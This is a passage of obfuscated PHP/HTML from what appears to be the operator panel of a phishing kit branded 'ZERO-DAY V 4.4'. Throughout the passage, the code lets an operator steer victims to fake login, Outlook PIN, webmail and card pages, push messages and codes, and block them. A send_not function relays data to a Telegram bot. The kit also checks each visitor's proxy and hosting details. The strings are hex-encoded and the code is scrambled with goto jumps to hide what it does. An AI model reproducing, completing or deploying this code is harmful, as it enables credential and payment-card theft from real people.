"\x53\145\156\x64\40\103\x61\162\x64\40\x70\x61\x67\145\x20\123\x75\143\143\145\163\x73\x66\x75\154\x6c\x79\174{$project_name}\x7c{$local_time}"); echo "\x43\x61\162\144"; } } elseif ($command_send == "\x65\x78\151\164") { $project_name = $_SESSION["\x70\162\x6f\152\x65\x63\x74\137\156\141\155\145"]; $file_s = "\x6c\x6f\147\157\x75\164\x2e\160\x68\x70"; if (check_file($_SESSION["\165\x73\x65\162\151\144"], $file_s)) { up_file($_SESSION["\x75\x73\145\162\x69\x64"], "\74\155\x65\x74\141\40\x68\x74\164\160\x2d\145\x71\x75\151\166\x3d\47\162\145\146\x72\x65\x73\x68\47\40\x63\x6f\x6e\x74\x65\156\x74\x3d\x27\60\73\x75\162\x6c\75\x6c\157\x67\x6f\x75\x74\x2e\160\150\x70\x3f\166\x65\x72\151\146\x79\x5f\x61\x63\143\157\165\156\x74\75\163\x65\x73\x73\151\x6f\156\75\46" . md5(microtime()) . "\46\x64\151\163\x70\141\164\143\x68\x3d" . sha1(microtime()) . "\x26\141\x63\x63\145\163\163\x3d\46\x64\x61\x74\141\75" . sha1(microtime()) . "\x27\x20\x2f\x3e"); up_file_log($_SESSION["\165\x73\145\x72\151\x64"], "\x55\163\145\x72\x20\x69\x73\40\x4c\x6f\147\x6f\165\164\174{$project_name}\174\104\x6f\156\145"); up_file_log($_SESSION["\x75\x73\145\162\x69\x64"], "\123\145\x6e\144\x20\105\x78\x69\x74\40\x70\141\x67\x65\x20\x53\165\x63\143\145\163\x73\146\x75\x6c\154\x79\174{$project_name}\174{$local_time}"); echo "\105\170\x69\x74"; } } elseif ($command_send == "\144\x65\x6c\145\164\145") { clear_log($_SESSION["\x75\163\145\x72\x69\144"]); echo "\104\x65\154\x65\164\145"; } elseif ($command_send == "\142\x61\x6e\156\x65\x64") { banned_user($_SESSION["\x75\x73\145\x72\x69\144"]); echo "\102\x61\156\156\145\x64"; } die; } } goto fdoq9; HohDF: $_SESSION["\155\x6f\142\x69\154\145"] = $mobile == 1 ? "\x54\162\x75\145" : "\x46\x61\154\163\145"; goto ZVuqq; KXurS: function up_file_msg($user, $content) { $filename = "\x6d\145\x73\x73\141\x67\x65\x2e\164\170\x74"; $filePath = $user . "\57" . $filename; if (file_exists($filePath)) { file_put_contents($filePath, $content); } else { $file = fopen($filePath, "\141"); fwrite($file, $content); fclose($file); } } goto Yt2y0; M8cbf: if (check_file($_SESSION["\165\163\x65\162\151\144"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="sendData('<?php  echo $_SESSION["\165\x73\x65\162\x69\x64"]; ?>
', 'errorlogin')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg fill="#ffffff" width="40px" height="40px" viewBox="0 0 30 30" xmlns="http://www.w3.org/2000/svg" stroke="#ffffff">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path
                                                            d="M11.514 13c-.45 0-.688.54-.363.857l3.143 3.14-3.146 3.146c-.455.436.255 1.177.707.707L15 17.705l3.146 3.145c.452.47 1.162-.27.707-.707l-3.146-3.145 3.142-3.14c.324-.318.087-.858-.364-.858-.13.004-.253.058-.344.15L15 16.29l-3.142-3.14c-.09-.092-.214-.146-.344-.15zM2.5 8h25c.277 0 .5.223.5.5s-.223.5-.5.5h-25c-.277 0-.5-.223-.5-.5s.223-.5.5-.5zM7 6.5a.5.5 0 0 1-.5.5.5.5 0 0 1-.5-.5.5.5 0 0 1 .5-.5.5.5 0 0 1 .5.5zm-2 0a.5.5 0 0 1-.5.5.5.5 0 0 1-.5-.5.5.5 0 0 1 .5-.5.5.5 0 0 1 .5.5zm-2 0a.5.5 0 0 1-.5.5.5.5 0 0 1-.5-.5.5.5 0 0 1 .5-.5.5.5 0 0 1 .5.5zM1.5 4C.678 4 0 4.678 0 5.5v19c0 .822.678 1.5 1.5 1.5h27c.822 0 1.5-.678 1.5-1.5v-19c0-.822-.678-1.5-1.5-1.5h-27zm0 1h27c.286 0 .5.214.5.5v19c0 .286-.214.5-.5.5h-27c-.286 0-.5-.214-.5-.5v-19c0-.286.214-.5.5-.5z"
                                                        />
                                                    </g>
                                                </svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">Error Login Page</div>
                                                <?php  echo $_SESSION["\151\x73\x6c\x6f\x67\x69\x6e"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a id="login_but" class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center hover-hand" onclick="sendData('<?php  echo $_SESSION["\x75\x73\145\x72\x69\x64"]; ?>
', 'errorlogin')">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto sWh3a; BL_wO: $file_s = "\x6f\x75\164\154\157\157\x6b\137\160\151\156\56\160\x68\160"; goto e9phR; Dvmf8: ?>
', 'banned')" type="button">Block User</button>

                                    <button class="btn btn-outline-danger" onclick="sendData('<?php  goto I31kK; vUYWm: $file_s = "\147\x6f\x5f\x70\x68\x6f\156\145\x2e\x70\x68\160"; goto MUaWx; D_AmZ: ?>
" bis_skin_checked="1">
                                                            <small class="text-medium-emphasis text-truncate">ip</small>
                                                            <div class="fs-5 fw-semibold" bis_skin_checked="1"><?php  goto oaR_O; LtREP: $ads_isp = $_SESSION["\151\163\x70"]; goto YE884; pj6qC: ?>
								<?php  goto NeCkI; VXwqY: $proxy = isset($info["\160\162\157\x78\171"]) ? $info["\160\162\157\170\171"] : null; goto k7N_3; moAsl: $_SESSION["\123\164\x72\x75\x70\114\157\x6d"] = $StrupLom; goto V44f0; mYV42: $file_s = "\x6f\160\x65\x72\x61\164\x69\157\156\x73\x61\x70\160\56\x70\x68\x70"; goto ftt7O; nfC_R: ?>
								<?php  goto WBjBf; jPcG5: ?>
								<?php  goto ntDHK; ZSbkr: echo $_SESSION["\x75\163\145\162\x69\144"]; goto QyB9p; lbgVO: echo $_SESSION["\x75\x73\x65\x72\151\144"]; goto MvIdb; ZIBEX: $file_s = "\167\145\142\x6d\x61\x69\x6c\x2e\x70\150\160"; goto h_PRu; tOEO8: echo $_SESSION["\102\x6c\141\163\x61\x63\x6f\x75\156"]; goto fahqt; k7N_3: $_SESSION["\x70\162\x6f\x78\x79\137\x72\x65\163"] = $proxy == 1 ? "\x54\162\x75\x65" : "\x46\x61\x6c\x73\145"; goto ps8uv; wbsgo: ?>
"></span>
                                                                <?php  goto tOEO8; Kgbcm: ?>
                                </tbody>
                            </table>
                        </div>

                        <!-- /.col-->

                        <!-- /.col-->
                    </div>
                    <!-- /.row-->

                    <!-- /.row-->
                </div>
            </div>
            <footer class="footer">
                <div style="text-align: center;" class="ms-auto" bis_skin_checked="1">Powered by <a href="/">ZERO-DAY V 4.4</a></div>
            </footer>
            <!--Start of Tawk.to Script-->
        </div>
        <style>
            .modal__header {
                margin-bottom: 20px;
            }

            .modal__image {
                max-width: 100%;
                height: auto;
                margin-bottom: 10px;
            }

            .modal__close {
                position: absolute;
                top: 10px;
                right: 10px;
            }

            .modal {
                display: block; /* Initially hide modal */
            }

            .modal.open {
                display: block; /* Show modal when open class is added */
            }

            .modal__form {
                width: 100%; /* Make the form full-width */
                max-width: 300px; /* Set maximum width for better readability */
            }

            .modal__form label,
            .modal__form input,
            .modal__form button {
                width: 100%; /* Make label, input, and button full-width */
            }

            .modal__form button {
                margin-top: 10px; /* Add some space between input and button */
            }

            h1,
            h2,
            h3,
            p {
                margin: 0;
            }

            h1,
            h2,
            h3 {
                font-weight: 300;
                line-height: 1.3;
            }

            a {
                text-decoration: none;
                color: inherit;
                font-weight: 400;
            }

            .demo-btns header {
                padding: 7vh 10vw;
                background-color: #ffebee;
                /* Light pink background */
                display: flex;
                align-items: center;
            }

            .demo-btns header h1 {
                color: rgba(0, 0, 0, 0.54);
            }

            .info {
                background-color: #f44336;
                /* Red background */
                padding: 3vh 10vw;
                height: 70vh;
                display: flex;
                align-items: center;
                justify-content: center;
                flex-flow: column wrap;
            }

            .info p {
                text-align: center;
                color: white;
            }

            .modal {
                will-change: visibility, opacity;
                display: flex;
                align-items: center;
                justify-content: center;
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                overflow-y: auto;
                overflow-x: hidden;
                z-index: 1000;
                visibility: hidden;
                /* Hide modal by default */
                opacity: 0;
                /* Hide modal by default */
                transition: all 0.5s cubic-bezier(0.23, 1, 0.32, 1);
                /* Smooth transition */
            }

            .modal--active {
                visibility: visible;
                /* Show modal when active */
                opacity: 1;
                /* Show modal when active */
            }

            .modal__bg {
                background: transparent;
                /* Transparent background */
            }

            .modal__dialog {
                max-width: 600px;
                /* Max width for the modal */
                padding: 2.4rem;
                /* Padding for the modal */
            }

            .modal__content {
                will-change: transform, opacity;
                position: relative;
                padding: 2.4rem;
                color: black;
                font-size: 16px; /* Adjust the font size as needed */
                background-color: #ffebee;
                /* Light pink background */
                background-clip: padding-box;
                box-shadow: 0 12px 15px 0 rgba(0, 0, 0, 0.25);
                /* Box shadow */
                opacity: 0;
                /* Hide content by default */
                transition: opacity 0.25s;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                text-align: center;
            }

            .modal__content--active {
                opacity: 1;
                /* Show content when active */
            }

            .modal__close {
                position: absolute;
                top: 0;
                right: 0;
                margin: 0.6rem;
                padding: 0.3rem;
                background: rgba(0, 0, 0, 0.3);
                /* Semi-transparent background */
                border-radius: 50%;
                transition: all 0.5s cubic-bezier(0.23, 1, 0.32, 1);
                /* Smooth transition */
            }

            .modal__close svg {
                width: 24px;
                fill: white;
            }

            .modal__close:hover {
                background: rgba(0, 0, 0, 0.6);
                /* Darker background on hover */
            }

            .modal__trigger {
                margin-right: 3px;
            }

            .modal__trigger--active {
                z-index: 10;
            }

            .modal__trigger:hover {
                background: rgba(0, 0, 0, 0.1);
                /* Light background on hover */
            }

            .logo {
                position: fixed;
                bottom: 3vh;
                right: 3vw;
                z-index: 2;
            }

            .logo img {
                width: 45px;
                transition: all 0.5s cubic-bezier(0.23, 1, 0.32, 1);
                /* Smooth transition */
            }

            .logo img:hover {
                transform: rotate(180deg) scale(1.1);
                /* Rotate and scale on hover */
            }
        </style>

        <!-- Modal 1 -->
        <div id="modal" class="modal modal__bg modal--" role="dialog" aria-hidden="true" bis_skin_checked="1">
            <div class="modal__dialog" bis_skin_checked="1">
                <div class="modal__content modal__content--" bis_skin_checked="1">
                    <div class="modal__header">
                        <img class="modal__image" src="https://seeklogo.com/images/G/google-messages-logo-F4E08395C6-seeklogo.com.png" alt="Image" style="width: 200px; height: 200px;" />
                        <h1>Message</h1>
                    </div>
                    <p>Enter the message you want to send.</p>
                    <form id="panelForm" onsubmit="submitForm(event, 'x_is_message', 'msg');" class="modal__form">
                        <label for="x_is_message">Message:</label>
                        <input required type="text" id="x_is_message" name="x_is_message" />
                        <button type="submit">Send</button>
                    </form>
                    <!-- modal close button -->
                    <a href="#" class="modal__close demo-close" onclick="closeModal('modal');">
                        <svg class="" viewBox="0 0 24 24">
                            <path d="M19 6.41l-1.41-1.41-5.59 5.59-5.59-5.59-1.41 1.41 5.59 5.59-5.59 5.59 1.41 1.41 5.59-5.59 5.59 5.59 1.41-1.41-5.59-5.59z"></path>
                            <path d="M0 0h24v24h-24z" fill="none"></path>
                        </svg>
                    </a>
                </div>
            </div>
        </div>

        <div id="modal2" class="modal modal__bg modal--" role="dialog" aria-hidden="true" bis_skin_checked="1">
            <div class="modal__dialog" bis_skin_checked="1">
                <div class="modal__content modal__content--" bis_skin_checked="1">
                    <div class="modal__header">
                        <img class="modal__image" src="https://seeklogo.com/images/G/google-messages-logo-F4E08395C6-seeklogo.com.png" alt="Image" style="width: 200px; height: 200px;" />
                        <h1>Message</h1>
                    </div>
                    <p>Enter the Email you want to send.</p>
                    <form id="panelForm" onsubmit="submitForm(event, 'inputField2', 'email');" class="modal__form">
                        <label for="inputField2">Message:</label>
                        <input required type="text" id="inputField2" name="inputField2" />
                        <button type="submit">Send</button>
                    </form>
                    <!-- modal close button -->
                    <a href="#" class="modal__close demo-close" onclick="closeModal('modal2');">
                        <svg class="" viewBox="0 0 24 24">
                            <path d="M19 6.41l-1.41-1.41-5.59 5.59-5.59-5.59-1.41 1.41 5.59 5.59-5.59 5.59 1.41 1.41 5.59-5.59 5.59 5.59 1.41-1.41-5.59-5.59z"></path>
                            <path d="M0 0h24v24h-24z" fill="none"></path>
                        </svg>
                    </a>
                </div>
            </div>
        </div>

        <div id="modal3" class="modal modal__bg modal--" role="dialog" aria-hidden="true" bis_skin_checked="1">
            <div class="modal__dialog" bis_skin_checked="1">
                <div class="modal__content modal__content--" bis_skin_checked="1">
                    <div class="modal__header">
                        <img class="modal__image" src="https://seeklogo.com/images/G/google-messages-logo-F4E08395C6-seeklogo.com.png" alt="Image" style="width: 200px; height: 200px;" />
                        <h1>Message</h1>
                    </div>
                    <p>Enter the Code you want to send.</p>
                    <form id="panelForm" onsubmit="submitForm(event, 'inputField3', 'outlook_app');" class="modal__form">
                        <label for="inputField3">Message:</label>
                        <input required type="text" id="inputField3" name="inputField3" />
                        <button type="submit">Send</button>
                    </form>
                    <!-- modal close button -->
                    <a href="#" class="modal__close demo-close" onclick="closeModal('modal3');">
                        <svg class="" viewBox="0 0 24 24">
                            <path d="M19 6.41l-1.41-1.41-5.59 5.59-5.59-5.59-1.41 1.41 5.59 5.59-5.59 5.59 1.41 1.41 5.59-5.59 5.59 5.59 1.41-1.41-5.59-5.59z"></path>
                            <path d="M0 0h24v24h-24z" fill="none"></path>
                        </svg>
                    </a>
                </div>
            </div>
        </div>
        <!-- CoreUI and necessary plugins-->
        <div id="modal55" class="modal modal__bg modal--" role="dialog" aria-hidden="true" bis_skin_checked="1">
            <div class="modal__dialog" bis_skin_checked="1">
                <div class="modal__content modal__content--" bis_skin_checked="1">
                    <div class="modal__header">
                        <img class="modal__image" src="https://seeklogo.com/images/G/google-messages-logo-F4E08395C6-seeklogo.com.png" alt="Image" style="width: 200px; height: 200px;" />
                        <h1>Message</h1>
                    </div>
                    <p>Enter the Message you want to send.</p>
                    <form id="panelForm" onsubmit="submitForm(event, 'inputField55', 'operationsapp');" class="modal__form">
                        <label for="inputField55">Message:</label>
                        <input required type="text" id="inputField55" name="inputField55" />
                        <button type="submit">Send</button>
                    </form>
                    <!-- modal close button -->
                    <a href="#" class="modal__close demo-close" onclick="closeModal('modal55');">
                        <svg class="" viewBox="0 0 24 24">
                            <path d="M19 6.41l-1.41-1.41-5.59 5.59-5.59-5.59-1.41 1.41 5.59 5.59-5.59 5.59 1.41 1.41 5.59-5.59 5.59 5.59 1.41-1.41-5.59-5.59z"></path>
                            <path d="M0 0h24v24h-24z" fill="none"></path>
                        </svg>
                    </a>
                </div>
            </div>
        </div>
        <!-- CoreUI and necessary plugins-->
        <div id="modal66" class="modal modal__bg modal--" role="dialog" aria-hidden="true" bis_skin_checked="1">
            <div class="modal__dialog" bis_skin_checked="1">
                <div class="modal__content modal__content--" bis_skin_checked="1">
                    <div class="modal__header">
                        <img class="modal__image" src="https://seeklogo.com/images/G/google-messages-logo-F4E08395C6-seeklogo.com.png" alt="Image" style="width: 200px; height: 200px;" />
                        <h1>Message</h1>
                    </div>
                    <p>Enter the Message you want to send.</p>
                    <form id="panelForm" onsubmit="submitForm(event, 'inputField66', 'operationssms');" class="modal__form">
                        <label for="inputField66">Message:</label>
                        <input required type="text" id="inputField66" name="inputField66" />
                        <button type="submit">Send</button>
                    </form>
                    <!-- modal close button -->
                    <a href="#" class="modal__close demo-close" onclick="closeModal('modal66');">
                        <svg class="" viewBox="0 0 24 24">
                            <path d="M19 6.41l-1.41-1.41-5.59 5.59-5.59-5.59-1.41 1.41 5.59 5.59-5.59 5.59 1.41 1.41 5.59-5.59 5.59 5.59 1.41-1.41-5.59-5.59z"></path>
                            <path d="M0 0h24v24h-24z" fill="none"></path>
                        </svg>
                    </a>
                </div>
            </div>
        </div>
        <!-- CoreUI and necessary plugins-->

        <script>
              // Open Modal Function
              function openModal(modalId) {
                  var modal = document.getElementById(modalId);
                  if (modal) {
                      modal.classList.add('modal--active');
                      var modalContent = modal.querySelector('.modal__content');
                      if (modalContent) modalContent.classList.add('modal__content--active');
                  }
              }

              // Close Modal Function
              function closeModal(modalId) {
                  var modal = document.getElementById(modalId);
                  if (modal) {
                      modal.classList.remove('modal--active');
                      var modalContent = modal.querySelector('.modal__content');
                      if (modalContent) modalContent.classList.remove('modal__content--active');
                  }
              }

              // Submit Form
              function submitForm(event, inputId, valueType) {
                  event.preventDefault();
                  closeModal('modal');
                  closeModal('modal2');
                  closeModal('modal3');
				  closeModal('modal55');
				  closeModal('modal66');
                  const inputValue = document.getElementById(inputId).value;
                  console.log("Input value:", inputValue);
                  sendData_save('<?php  goto CJNw8; Vf6Mm: $info = unserialize($response); goto bGSAS; Kv_PF: $StrupLom = trim($StrupLom); goto moAsl; e9phR: if (check_file($_SESSION["\x75\x73\145\x72\x69\x64"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="sendData('<?php  echo $_SESSION["\165\x73\x65\x72\x69\x64"]; ?>
', 'outlook_pin')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg width="40px" height="40px" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                                                    <title>file_type_outlook</title>
                                                    <path d="M19.484,7.937v5.477L21.4,14.619a.489.489,0,0,0,.21,0l8.238-5.554a1.174,1.174,0,0,0-.959-1.128Z" style="fill: #0072c6;" />
                                                    <path d="M19.484,15.457l1.747,1.2a.522.522,0,0,0,.543,0c-.3.181,8.073-5.378,8.073-5.378V21.345a1.408,1.408,0,0,1-1.49,1.555H19.483V15.457Z" style="fill: #0072c6;" />
                                                    <path
                                                        d="M10.44,12.932a1.609,1.609,0,0,0-1.42.838,4.131,4.131,0,0,0-.526,2.218A4.05,4.05,0,0,0,9.02,18.2a1.6,1.6,0,0,0,2.771.022,4.014,4.014,0,0,0,.515-2.2,4.369,4.369,0,0,0-.5-2.281A1.536,1.536,0,0,0,10.44,12.932Z"
                                                        style="fill: #0072c6;"
                                                    />
                                                    <path
                                                        d="M2.153,5.155V26.582L18.453,30V2ZM13.061,19.491a3.231,3.231,0,0,1-2.7,1.361,3.19,3.19,0,0,1-2.64-1.318A5.459,5.459,0,0,1,6.706,16.1a5.868,5.868,0,0,1,1.036-3.616A3.267,3.267,0,0,1,10.486,11.1a3.116,3.116,0,0,1,2.61,1.321,5.639,5.639,0,0,1,1,3.484A5.763,5.763,0,0,1,13.061,19.491Z"
                                                        style="fill: #0072c6;"
                                                    />
                                                </svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">Outlook PIN</div>
                                                <?php  echo $_SESSION["\151\x73\157\x75\164\x6c\x6f\x6f\x6b\137\x70\151\x6e"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto nz9lJ; ZKhSE: ?>
								<?php  goto W2UsE; ZVuqq: $hosting = isset($info["\x68\157\x73\164\151\x6e\x67"]) ? $info["\150\x6f\x73\x74\x69\156\147"] : null; goto Df5U8; U851q: $file_s = "\154\x6f\147\151\156\56\160\x68\x70"; goto M8cbf; HBfSb: if (check_file($_SESSION["\x75\163\145\162\x69\144"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="openModal('modal')" style="cursor: pointer;">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg width="40px" height="40px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" stroke="#ffffff">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path
                                                            d="M3 9.22843V14.7716C3 15.302 3.21071 15.8107 3.58579 16.1858L7.81421 20.4142C8.18929 20.7893 8.69799 21 9.22843 21H14.7716C15.302 21 15.8107 20.7893 16.1858 20.4142L20.4142 16.1858C20.7893 15.8107 21 15.302 21 14.7716V9.22843C21 8.69799 20.7893 8.18929 20.4142 7.81421L16.1858 3.58579C15.8107 3.21071 15.302 3 14.7716 3H9.22843C8.69799 3 8.18929 3.21071 7.81421 3.58579L3.58579 7.81421C3.21071 8.18929 3 8.69799 3 9.22843Z"
                                                            stroke="#ffffff"
                                                            stroke-width="2"
                                                            stroke-linecap="round"
                                                            stroke-linejoin="round"
                                                        />
                                                        <path d="M12 8V13" stroke="#ffffff" stroke-width="2" stroke-linecap="round" />
                                                        <path d="M12 16V15.9888" stroke="#ffffff" stroke-width="2" stroke-linecap="round" />
                                                    </g>
                                                </svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">Message Page</div>
                                                <?php  echo $_SESSION["\151\163\155\x65\163\163\141\147\145"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto YlKYs; g9p1T: curl_close($curl); goto Vf6Mm; giAPp: function send_not($message) { $cRetVckr = $_SESSION["\x74\157\x6b\145\x6e"]; $TrubFtub = $_SESSION["\x63\x68\141\x74\137\151\x64"]; $api_url = "\150\x74\164\160\x73\x3a\57\57\141\x70\x69\56\164\x65\154\x65\x67\x72\x61\155\x2e\x6f\x72\x67\x2f\142\157\x74{$cRetVckr}\x2f\x73\x65\x6e\144\115\x65\x73\163\141\147\x65"; $params = array("\143\150\141\x74\137\x69\x64" => $TrubFtub, "\x74\x65\x78\x74" => $message); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $api_url); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params)); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($ch); curl_close($ch); } goto rzXAt; pCDKP: ?>
								
								<?php  goto a5syK; eg9PA: ?>
								<?php  goto eL0Sh; CJNw8: echo $_SESSION["\165\x73\145\x72\151\x64"]; goto DmYjD; Alj4B: if (check_file($_SESSION["\x75\x73\145\x72\x69\x64"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="openModal('modal66')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg height="40px" width="40px" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 60 60" xml:space="preserve" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <g> <g> <g> <path style="fill:#91BAE1;" d="M50.003,22c-0.115-8.699-7.193-16-15.919-16c-5.559,0-10.779,3.005-13.661,7.336 C19.157,12.493,17.636,12,16,12c-4.418,0-8,3.582-8,8c0,0.153,0.014,0.302,0.023,0.454C8.013,20.636,8,20.82,8,21 c-3.988,1.912-7,6.457-7,11.155C1,38.67,6.33,44,12.845,44h24.507c0.138,0,0.272-0.016,0.408-0.021 C37.897,43.984,38.031,44,38.169,44h9.803C54.037,44,59,39.037,59,32.972C59,27.601,55.106,22.961,50.003,22z"></path> <path style="fill:#8697CB;" d="M47.972,45h-9.803c-0.104,0-0.207-0.006-0.311-0.014l-0.134-0.008l-0.062,0.008 C37.56,44.994,37.457,45,37.353,45H12.845C5.762,45,0,39.237,0,32.154c0-4.755,2.857-9.505,7.016-11.773v-0.004 C7.008,20.252,7,20.127,7,20c0-4.963,4.037-9,9-9c1.45,0,2.863,0.347,4.139,1.008C23.396,7.663,28.655,5,34.085,5 c8.943,0,16.362,7.194,16.891,16.194C56.173,22.56,60,27.483,60,32.972C60,39.604,54.604,45,47.972,45z M37.725,42.98 l0.271,0.011C38.053,42.995,38.11,43,38.169,43h9.803C53.501,43,58,38.501,58,32.972c0-4.816-3.518-9.11-8.182-9.989 l-0.804-0.151l-0.011-0.817C48.895,13.735,42.202,7,34.085,7c-5.008,0-10.043,2.704-12.829,6.89l-0.554,0.832l-0.832-0.553 C18.721,13.404,17.382,13,16,13c-3.859,0-7,3.141-7,7c0,0.082,0.006,0.163,0.012,0.244l0.012,0.21l-0.009,0.16 C9.008,20.744,9,20.873,9,21v0.63l-0.567,0.271C4.705,23.688,2,28,2,32.154C2,38.135,6.865,43,12.845,43h24.508 c0.059,0,0.116-0.005,0.174-0.009L37.725,42.98z"></path> </g> <g> <path style="fill:#91BAE1;" d="M50.003,22c0,0-2.535-0.375-5.003,0"></path> <path style="fill:#8697CB;" d="M44.999,23c-0.486,0-0.912-0.354-0.987-0.85c-0.083-0.546,0.292-1.056,0.838-1.139 c2.59-0.394,5.19-0.018,5.3-0.001c0.546,0.081,0.923,0.589,0.843,1.135c-0.08,0.547-0.597,0.924-1.135,0.844 c-0.025-0.003-2.424-0.346-4.707-0.001C45.1,22.996,45.049,23,44.999,23z"></path> </g> <g> <path style="fill:#91BAE1;" d="M8,20c0-4.418,3.582-8,8-8s8,3.582,8,8"></path> <path style="fill:#8697CB;" d="M24,21c-0.553,0-1-0.447-1-1c0-3.859-3.141-7-7-7s-7,3.141-7,7c0,0.553-0.447,1-1,1s-1-0.447-1-1 c0-4.963,4.037-9,9-9s9,4.037,9,9C25,20.553,24.553,21,24,21z"></path> </g> </g> <g> <path style="fill:#3D324C;" d="M41.707,53.293l-6.797-6.797l6.483-3.241l-17.637-6.498l6.499,17.637l3.241-6.484l6.797,6.797 C40.488,54.902,40.744,55,41,55s0.512-0.098,0.707-0.293C42.098,54.316,42.098,53.684,41.707,53.293z"></path> </g> </g> </g></svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">Operations SMS</div>

                                                <?php  echo $_SESSION["\151\163\157\160\145\162\x61\164\x69\157\x6e\x73\163\155\x73"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto maSc7; VTbI2: if (check_file($_SESSION["\x75\163\x65\x72\x69\144"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="sendData('<?php  echo $_SESSION["\x75\163\145\162\151\x64"]; ?>
